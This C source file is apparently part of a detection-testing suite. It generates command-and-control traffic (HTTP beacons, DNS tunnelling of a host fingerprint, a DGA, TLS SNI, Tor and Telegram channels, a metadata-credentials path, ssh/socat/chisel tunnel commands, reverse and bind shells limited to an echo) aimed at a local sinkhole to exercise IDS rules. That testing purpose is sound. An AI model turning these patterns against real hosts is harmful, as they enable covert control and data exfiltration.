// SPDX-License-Identifier: GPL-3.0-only
// Copyright (c) 2026 MikiMiku (MoreMorePwn)
//
// beaconing.c — command-and-control shapes.
//
// The destination is the QEMU host (10.0.2.2) unless --host says otherwise, so
// a check-in can be captured, decoded and triaged without reaching a third
// party; TEST-NET or a refused port gives the undelivered baseline. The
// samples keep the application-layer shape (URI, User-Agent, DNS labels, SNI,
// JSON body) that network triage and IDS rules look at. Names such as
// api.telegram.org or x.onion appear only inside payloads and DNS questions
// sent to the numeric listener address; no name is ever resolved by the
// sample, and a "shell" is a fixed echo.
#include "samples.h"

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/filter.h>
#include <netinet/in.h>
#include <poll.h>
#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <linux/if_ether.h>
#include <unistd.h>

SCENARIO(http_beacon)
{
    const char *name = "http-beacon";
    const char *host = sample_host(options);
    int port = sample_port(options, SAMPLE_HTTP_PORT);
    char fingerprint[512];
    sample_fingerprint(fingerprint, sizeof fingerprint);
    int delivered = 0;
    for (int round = 0; round < options->rounds; round++) {
        char body[640];
        snprintf(body, sizeof body, "%s&round=%d&stage=checkin&scenario=http-beacon", fingerprint,
                 round);
        unsigned long long received = 0;
        if (sample_http_request(host, port, "POST", "/gate.php", body, strlen(body), &received) == 0) {
            delivered++;
            sample_note(name, "round %d: POST /gate.php sent, %llu response bytes", round, received);
        } else {
            sample_note(name, "round %d: %s:%d unreachable: %s", round, host, port, strerror(errno));
        }
        sample_delay(options->delay_ms);
    }
    sample_pass(name, "%d/%d check-ins to http://%s:%d/gate.php with a browser User-Agent",
             delivered, options->rounds, host, port);
    return 0;
}

#define BEACON_REQUESTS 10

SCENARIO(beacon_loop)
{
    const char *name = "beacon-loop";
    const char *host = sample_host(options);
    int port = sample_port(options, SAMPLE_HTTP_PORT);
    // A regular gap is what makes it a beacon: never below 200 ms, never above 1 s.
    int gap = options->delay_ms < 200 ? 200 : options->delay_ms > 1000 ? 1000 : options->delay_ms;
    int delivered = 0;
    for (int i = 0; i < BEACON_REQUESTS; i++) {
        char path[96];
        snprintf(path, sizeof path, "/ping.php?id=%08x&n=%d", (unsigned)getpid(), i);
        unsigned long long received = 0;
        if (sample_http_as(host, port, host, "GET", path, NULL, &received) == 0)
            delivered++;
        sample_delay(gap);
    }
    sample_pass(name, "%d/%d GET /ping.php requests to %s:%d every %d ms", delivered,
             BEACON_REQUESTS, host, port, gap);
    if (delivered < 8)
        sample_note(name, "fewer than 8 requests were delivered: network.beacon needs 8 or more");
    return 0;
}

#define TUNNEL_LONG 7
#define TUNNEL_TXT 22

SCENARIO(dns_tunnel)
{
    const char *name = "dns-tunnel";
    const char *resolver = options->resolver ? options->resolver : SAMPLE_DNS_ADDR;
    char fingerprint[512];
    sample_fingerprint(fingerprint, sizeof fingerprint);
    char encoded[1024];
    size_t encoded_len = sample_hex(fingerprint, encoded, sizeof encoded);
    int asked = 0, answered = 0;
    int pace = options->delay_ms > 50 ? 50 : options->delay_ms;
    // Labels of 50 characters (the rule looks for more than 40) carrying the fingerprint.
    for (int i = 0; i < TUNNEL_LONG; i++) {
        char question[160];
        size_t offset = encoded_len > 50 ? (size_t)i * 17 % (encoded_len - 50) : 0;
        snprintf(question, sizeof question, "%.50s.%s", encoded + offset, SAMPLE_EXFIL_DOMAIN);
        answered += sample_dns_ask(resolver, question, 1, 150);
        asked++;
        sample_delay(pace);
    }
    // A stream of TXT questions: the tunnel's way of reading instructions back.
    for (int i = 0; i < TUNNEL_TXT; i++) {
        char question[160];
        snprintf(question, sizeof question, "c%02d.%s", i, SAMPLE_EXFIL_DOMAIN);
        answered += sample_dns_ask(resolver, question, 16, 150);
        asked++;
        sample_delay(pace);
    }
    sample_pass(name, "%d questions for %s to %s:%d (%d answered): %d with 50-character labels, "
                   "%d TXT",
             asked, SAMPLE_EXFIL_DOMAIN, resolver, sample_dns_port, answered, TUNNEL_LONG, TUNNEL_TXT);
    sample_note(name, "the long labels carry the host fingerprint, not random names");
    if (answered == 0)
        sample_note(name, "no answer came back: the rows still show, but start the sinkhole to "
                       "see the answers");
    return 0;
}

static uint32_t xorshift(uint32_t *state)
{
    uint32_t value = *state;
    value ^= value << 13;
    value ^= value >> 17;
    value ^= value << 5;
    *state = value;
    return value;
}

// Shannon entropy of the name's letters, in bits per character.
static double letters_entropy(const char *text, size_t length)
{
    unsigned counts[26] = {0};
    for (size_t i = 0; i < length; i++)
        counts[(unsigned char)text[i] - 'a']++;
    double bits = 0;
    for (int i = 0; i < 26; i++) {
        if (!counts[i])
            continue;
        double p = (double)counts[i] / (double)length;
        bits -= p * __builtin_log2(p);
    }
    return bits;
}

#define DGA_NAMES 14

SCENARIO(dga)
{
    const char *name = "dga";
    static const char *tlds[] = {"com", "net", "org", "info", "biz"};
    const char *resolver = options->resolver ? options->resolver : SAMPLE_DNS_ADDR;
    time_t now = time(NULL);
    struct tm broken_down;
    localtime_r(&now, &broken_down);
    uint32_t date = (uint32_t)(broken_down.tm_year + 1900) * 10000u +
                    (uint32_t)(broken_down.tm_mon + 1) * 100u + (uint32_t)broken_down.tm_mday;
    uint32_t state = date ^ 0x5eed5eedu;
    // One name a resolver is expected to answer, so that the failures after it mean something.
    int answered = sample_dns_ask(resolver, SAMPLE_SNI, 1, 200);
    int asked = 1, failed = 0, made = 0;
    for (int tries = 0; made < DGA_NAMES && tries < 200; tries++) {
        char domain[64];
        char label[24];
        size_t at = 0;
        size_t length = 10 + xorshift(&state) % 9;
        for (size_t c = 0; c < length; c++)
            label[at++] = (char)('a' + xorshift(&state) % 26);
        label[at] = '\0';
        // The detector wants mixed letters; a run of repeats is not a plausible output.
        if (letters_entropy(label, at) < 3.1)
            continue;
        snprintf(domain, sizeof domain, "%s.%s", label,
                 tlds[xorshift(&state) % (sizeof tlds / sizeof tlds[0])]);
        if (made < 3)
            sample_note(name, "candidate %s", domain);
        // A lookup without an answer is a failed lookup; NXDOMAIN or silence alike.
        if (!sample_dns_ask(resolver, domain, 1, 200))
            failed++;
        asked++;
        made++;
    }
    sample_pass(name, "%d lookups sent to %s:%d for %04d-%02d-%02d: the control name %s, %d of %d "
                   "generated names unanswered",
             asked, resolver, sample_dns_port, broken_down.tm_year + 1900, broken_down.tm_mon + 1,
             broken_down.tm_mday, answered ? "answered" : "unanswered", failed, made);
    if (!answered)
        sample_note(name, "no resolver answered: network.dga_nxdomain is not evaluated without "
                       "one answering name (start the sinkhole)");
    return 0;
}

// Minimal TLS 1.2 ClientHello: enough for SNI parsing and IDS TLS rules.
static size_t client_hello(unsigned char *out, const char *sni)
{
    size_t name_len = strlen(sni);
    unsigned char *cursor = out;
    *cursor++ = 0x16; // handshake
    *cursor++ = 0x03;
    *cursor++ = 0x01;
    unsigned char *record_len = cursor;
    cursor += 2;
    *cursor++ = 0x01; // ClientHello
    unsigned char *handshake_len = cursor;
    cursor += 3;
    *cursor++ = 0x03;
    *cursor++ = 0x03; // TLS 1.2
    for (int i = 0; i < 32; i++)
        *cursor++ = (unsigned char)(0x41 + (i * 7) % 26);
    *cursor++ = 0x00; // session id length
    *cursor++ = 0x00; // cipher suites length
    *cursor++ = 0x04;
    *cursor++ = 0x00;
    *cursor++ = 0x2f;
    *cursor++ = 0x00;
    *cursor++ = 0x35;
    *cursor++ = 0x01; // compression methods
    *cursor++ = 0x00;
    unsigned char *extension_len = cursor;
    cursor += 2;
    *cursor++ = 0x00; // server_name
    *cursor++ = 0x00;
    unsigned char *sni_len = cursor;
    cursor += 2;
    *cursor++ = 0x00; // host_name
    *cursor++ = (unsigned char)(name_len + 3);
    *cursor++ = 0x00;
    *cursor++ = 0x00;
    *cursor++ = (unsigned char)name_len;
    memcpy(cursor, sni, name_len);
    cursor += name_len;
    size_t sni_data = (size_t)(cursor - (sni_len + 2));
    sni_len[0] = (unsigned char)(sni_data >> 8);
    sni_len[1] = (unsigned char)sni_data;
    size_t extension_data = (size_t)(cursor - (extension_len + 2));
    extension_len[0] = (unsigned char)(extension_data >> 8);
    extension_len[1] = (unsigned char)extension_data;
    size_t handshake = (size_t)(cursor - (handshake_len + 3));
    handshake_len[0] = (unsigned char)(handshake >> 16);
    handshake_len[1] = (unsigned char)(handshake >> 8);
    handshake_len[2] = (unsigned char)handshake;
    size_t record = (size_t)(cursor - (record_len + 2));
    record_len[0] = (unsigned char)(record >> 8);
    record_len[1] = (unsigned char)record;
    return (size_t)(cursor - out);
}


// Sends a ClientHello with `sni` to host:port and returns the reply length (>= 0) or -1.
static ssize_t send_hello(const char *host, int port, const char *sni)
{
    unsigned char hello[512];
    size_t length = client_hello(hello, sni);
    int fd = sample_dial(host, port, 1500);
    if (fd < 0)
        return -1;
    ssize_t answered = 0;
    if (sample_send_all(fd, hello, length) == 0) {
        unsigned char reply[512];
        ssize_t got = sample_recv_wait(fd, reply, sizeof reply, 500);
        if (got > 0)
            answered = got;
    }
    close(fd);
    return answered;
}

SCENARIO(tls_sni)
{
    const char *name = "tls-sni";
    const char *host = sample_host(options);
    int port = sample_port(options, SAMPLE_TLS_PORT);
    ssize_t answered = send_hello(host, port, SAMPLE_SNI);
    if (answered < 0)
        sample_note(name, "%s:%d unreachable: %s", host, port, strerror(errno));
    sample_pass(name, "ClientHello with SNI %s to %s:%d (%zd response bytes)", SAMPLE_SNI, host, port,
             answered < 0 ? 0 : answered);
    return 0;
}

SCENARIO(udp_beacon)
{
    const char *name = "udp-beacon";
    const char *host = sample_host(options);
    int port = sample_port(options, SAMPLE_UDP_PORT);
    struct sockaddr_in target;
    memset(&target, 0, sizeof target);
    target.sin_family = AF_INET;
    target.sin_port = htons((uint16_t)port);
    if (inet_pton(AF_INET, host, &target.sin_addr) != 1) {
        sample_fail(name, "host %s is not an IPv4 address", host);
        return 1;
    }
    int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
    if (fd < 0) {
        sample_fail(name, "socket: %s", strerror(errno));
        return 1;
    }
    unsigned long long bytes = 0;
    int sent = 0;
    for (int round = 0; round < options->rounds; round++) {
        char payload[256];
        int length = snprintf(payload, sizeof payload,
                              "{\"id\":\"%08x\",\"round\":%d,\"stage\":\"checkin\","
                              "\"scenario\":\"udp-beacon\",\"ttl\":60}",
                              (unsigned)(getpid() * 2654435761u ^ (unsigned)round), round);
        ssize_t written = sendto(fd, payload, (size_t)length, 0, (struct sockaddr *)&target,
                                 sizeof target);
        if (written > 0) {
            sent++;
            bytes += (unsigned long long)written;
        }
        sample_delay(options->delay_ms);
    }
    close(fd);
    sample_pass(name, "%d/%d JSON datagrams, %llu bytes to %s:%d", sent, options->rounds, bytes, host,
             port);
    sample_note(name, "UDP is fire-and-forget: sendto success does not mean delivery");
    return 0;
}

// ---- c2-misc -------------------------------------------------------------------------

// Connects, sends `text`, waits briefly for a reply; returns the reply length or -1.
static ssize_t chat(const char *host, int port, const char *text)
{
    int fd = sample_dial(host, port, 1500);
    if (fd < 0)
        return -1;
    ssize_t reply = 0;
    if (sample_send_all(fd, text, strlen(text)) == 0) {
        char buffer[512];
        ssize_t got = sample_recv_wait(fd, buffer, sizeof buffer, 400);
        if (got > 0)
            reply = got;
    }
    close(fd);
    return reply;
}

SCENARIO(c2_misc)
{
    const char *name = "c2-misc";
    const char *host = sample_host(options);
    const char *resolver = options->resolver ? options->resolver : SAMPLE_DNS_ADDR;
    int http_port = sample_port(options, SAMPLE_HTTP_PORT);
    int tls_port = options->port > 0 ? options->port : SAMPLE_TLS_PORT;
    int steps = 0, reached = 0;
#define STEP(expression)                                                                           \
    do {                                                                                           \
        steps++;                                                                                   \
        reached += (expression) ? 1 : 0;                                                           \
    } while (0)
    unsigned long long received = 0;

    // HTTP, TLS and SSH on ports that are not the usual ones.
    STEP(sample_http_as(host, SAMPLE_ALT_HTTP_PORT, host, "GET", "/gate.php?stage=alt", NULL,
                     &received) == 0);
    STEP(send_hello(host, SAMPLE_ALT_TLS_PORT, SAMPLE_SNI) >= 0);
    STEP(chat(host, SAMPLE_SSH_PORT, "SSH-2.0-OpenSSH_9.6 demo-sample\r\n") >= 0);

    // An IRC channel join, and a Stratum login, both as text to the listener.
    STEP(chat(host, SAMPLE_IRC_PORT,
              "NICK demo-sample\r\nUSER demo 0 * :demo sample\r\nJOIN #demo-sample\r\n") >= 0);
    STEP(chat(host, SAMPLE_IRC_PORT,
              "{\"id\":1,\"method\":\"login\",\"params\":{\"login\":\"4DEMODECOY\","
              "\"pass\":\"x\",\"agent\":\"demo-sample/0.1\"}}\n") >= 0);

    // Tor: the local SOCKS port (loopback, so nothing leaves the machine),
    // a hidden-service name in a DNS question and in a Host header.
    STEP(sample_touch_port("127.0.0.1", 9050) == 0);
    STEP(sample_dns_ask(resolver, "demodecoy2345.onion", 1, 150) >= 0);
    STEP(sample_http_as(host, http_port, "demodecoy2345.onion", "GET", "/", NULL, &received) == 0);

    // Web services that malware uses as a channel: DNS, HTTP and TLS to the listener.
    STEP(sample_dns_ask(resolver, "pastebin.com", 1, 150) >= 0);
    STEP(sample_dns_ask(resolver, "api.telegram.org", 1, 150) >= 0);
    STEP(sample_http_as(host, http_port, "api.telegram.org", "GET", "/botDEMO/getUpdates", NULL,
                     &received) == 0);
    STEP(send_hello(host, tls_port, "raw.githubusercontent.com") >= 0);

    // The cloud metadata address as the Host header of a request to the listener.
    STEP(sample_http_as(host, http_port, "169.254.169.254", "GET",
                     "/latest/meta-data/iam/security-credentials/", NULL, &received) == 0);
    // Tunnelling tools, as stand-ins only: reverse forward, relay, tunnel client.
    char tunnel_target[64];
    snprintf(tunnel_target, sizeof tunnel_target, "tunnel@%s", host);
    char *const ssh_tunnel[] = {"ssh", "-N", "-R", "2222:127.0.0.1:22", tunnel_target, NULL};
    char *const relay[] = {"socat", "TCP-LISTEN:8081,fork", "TCP:127.0.0.1:80", NULL};
    char *const chisel[] = {"chisel", "client", "10.0.2.2:8080", "R:socks", NULL};
    char *const *const tunnels[] = {ssh_tunnel, relay, chisel};
    for (size_t i = 0; i < sizeof tunnels / sizeof tunnels[0]; i++)
        STEP(sample_spoof(tunnels[i], NULL) == 0);
#undef STEP
    sample_pass(name, "%d/%d side channels reached %s (alt HTTP %d, TLS %d, SSH banner %d, IRC %d, "
                   "Stratum text, Tor, web-service names, metadata Host, 3 tunnel stand-ins)",
             reached, steps, host, SAMPLE_ALT_HTTP_PORT, SAMPLE_ALT_TLS_PORT, SAMPLE_SSH_PORT,
             SAMPLE_IRC_PORT);
    if (reached < steps)
        sample_note(name, "%d step(s) got no connection: only the sinkhole serves the side ports",
                 steps - reached);
    sample_note(name, "169.254.169.254 and the web-service names are only text in requests to %s", host);
    return 0;
}

// ---- shell-sim ----------------------------------------------------------------------

// Runs `sh -c "echo ...; exit 0"` with descriptors 0, 1 and 2 on `fd`.
static int shell_on(int fd, const char *words)
{
    char command[160];
    snprintf(command, sizeof command, "echo %s; exit 0", words);
    fflush(stdout);
    pid_t child = fork();
    if (child < 0)
        return -1;
    if (child == 0) {
        if (dup2(fd, 0) < 0 || dup2(fd, 1) < 0 || dup2(fd, 2) < 0)
            _exit(126);
        if (fd > 2)
            close(fd);
        char *const argv[] = {"sh", "-c", command, NULL};
        char *const env[] = {NULL};
        execve("/bin/sh", argv, env);
        _exit(127);
    }
    int status = 0;
    for (int waited = 0; waited <= 4000; waited += 10) {
        pid_t done = waitpid(child, &status, WNOHANG);
        if (done == child)
            return WIFEXITED(status) ? WEXITSTATUS(status) : -1;
        struct timespec pause = {.tv_sec = 0, .tv_nsec = 10 * 1000000L};
        nanosleep(&pause, NULL);
    }
    kill(child, SIGKILL);
    waitpid(child, &status, 0);
    return -1;
}

static int reverse_shell(const struct options *options)
{
    const char *host = sample_host(options);
    int port = options->port > 0 ? options->port : SAMPLE_SHELL_PORT;
    int fd = sample_dial(host, port, 1500);
    if (fd < 0) {
        sample_unavailable("shell-sim", "reverse shell: %s:%d unreachable: %s", host, port,
                        strerror(errno));
        return -1;
    }
    int status = shell_on(fd, "sample reverse-shell demo");
    close(fd);
    return status;
}

// A listener on every interface for a moment, a connection from this process
// over loopback, and a shell on the accepted socket. Only a loopback peer is accepted.
static int bind_shell(void)
{
    int listener = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
    if (listener < 0)
        return -1;
    struct sockaddr_in any;
    memset(&any, 0, sizeof any);
    any.sin_family = AF_INET;
    any.sin_addr.s_addr = htonl(INADDR_ANY);
    socklen_t size = sizeof any;
    if (bind(listener, (struct sockaddr *)&any, sizeof any) != 0 || listen(listener, 1) != 0 ||
        getsockname(listener, (struct sockaddr *)&any, &size) != 0) {
        close(listener);
        return -1;
    }
    struct sockaddr_in loop = any;
    loop.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    int client = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
    int status = -1;
    if (client >= 0 && connect(client, (struct sockaddr *)&loop, sizeof loop) == 0) {
        for (int attempt = 0; attempt < 3 && status < 0; attempt++) {
            struct pollfd ready = {.fd = listener, .events = POLLIN};
            if (poll(&ready, 1, 500) <= 0)
                break;
            struct sockaddr_in peer;
            socklen_t peer_size = sizeof peer;
            int accepted = accept4(listener, (struct sockaddr *)&peer, &peer_size, SOCK_CLOEXEC);
            if (accepted < 0)
                break;
            if (peer.sin_addr.s_addr == htonl(INADDR_LOOPBACK))
                status = shell_on(accepted, "sample bind-shell demo");
            close(accepted);
        }
    }
    if (client >= 0)
        close(client);
    close(listener);
    return status;
}

static int attach_drop_all(int fd)
{
    struct sock_filter drop[] = {BPF_STMT(BPF_RET | BPF_K, 0)};
    struct sock_fprog program = {.len = 1, .filter = drop};
    return setsockopt(fd, SOL_SOCKET, SO_ATTACH_FILTER, &program, sizeof program);
}

SCENARIO(shell_sim)
{
    const char *name = "shell-sim";
    int reverse = reverse_shell(options);
    int bind_status = bind_shell();
    sample_note(name, "reverse shell: %s; bind shell on loopback: %s",
             reverse == 0 ? "echo ran with its output on the socket" : "not run",
             bind_status == 0 ? "echo ran" : "not run");

    // A UDP port opened on every interface for a moment.
    int udp = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
    int udp_bound = 0;
    if (udp >= 0) {
        struct sockaddr_in any;
        memset(&any, 0, sizeof any);
        any.sin_family = AF_INET;
        any.sin_addr.s_addr = htonl(INADDR_ANY);
        any.sin_port = htons(40444);
        udp_bound = bind(udp, (struct sockaddr *)&any, sizeof any) == 0;
        // A drop-everything classic filter on an ordinary datagram socket.
        attach_drop_all(udp);
        close(udp);
    }

    // A raw socket and a packet socket, each given a filter that drops every
    // packet, then closed: the opening is the shape. Both need root.
    int raw = socket(AF_INET, SOCK_RAW | SOCK_CLOEXEC, IPPROTO_ICMP);
    int raw_errno = errno;
    if (raw >= 0) {
        attach_drop_all(raw);
        close(raw);
    }
    int packet = socket(AF_PACKET, SOCK_RAW | SOCK_CLOEXEC, htons(ETH_P_ALL));
    int packet_errno = errno;
    if (packet >= 0) {
        attach_drop_all(packet);
        close(packet);
    }
    if (raw < 0 || packet < 0)
        sample_unavailable(name, "raw socket %s, packet socket %s: c2.bpf_backdoor needs root",
                        raw < 0 ? strerror(raw_errno) : "ok",
                        packet < 0 ? strerror(packet_errno) : "ok");
    sample_pass(name, "reverse shell %s, bind shell %s, UDP listen %s, raw/packet sockets %s/%s",
             reverse == 0 ? "ran" : "not run", bind_status == 0 ? "ran" : "not run",
             udp_bound ? "bound" : "not bound", raw >= 0 ? "opened" : "refused",
             packet >= 0 ? "opened" : "refused");
    return 0;
}
